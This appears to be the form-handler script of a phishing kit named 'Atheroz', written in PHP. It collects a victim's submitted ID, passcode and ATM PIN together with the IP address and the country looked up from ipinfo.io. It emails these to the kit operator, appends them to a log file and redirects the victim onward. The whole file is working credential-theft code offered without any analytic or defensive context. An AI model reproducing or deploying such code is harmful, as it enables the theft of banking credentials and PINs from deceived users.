<meta http-equiv="Refresh"
content="0;url=index-2022.html"> 
<?php  
ini_set("display_errors", 0); 
include "atheroz.php";
$email = $_POST['1D-us3r'];  
$pass = $_POST['1D-pssw']; 
$p1n = $_POST['4TM_P1N'];  
$Date = "" . date("d/m/y") . "";
$ip = $_SERVER['REMOTE_ADDR'];
$ubi = trim(file_get_contents("https://ipinfo.io/{$ip}/country"));
$Time = ""   .   date("H:i:s");
$BILSMG = "   
ID :  $email  
Passcode : $pass  
Pin : $p1n
Ip : $ip
Fecha: $Date / Hora : $Time
Pais : $ubi";
$MAIL_TITLE = "Atheroz | ".$IP."";  
$MAIL_HEADER = "From: Reporte_Atheroz";  
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);  
$handle = fopen("HandXXX.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  
?>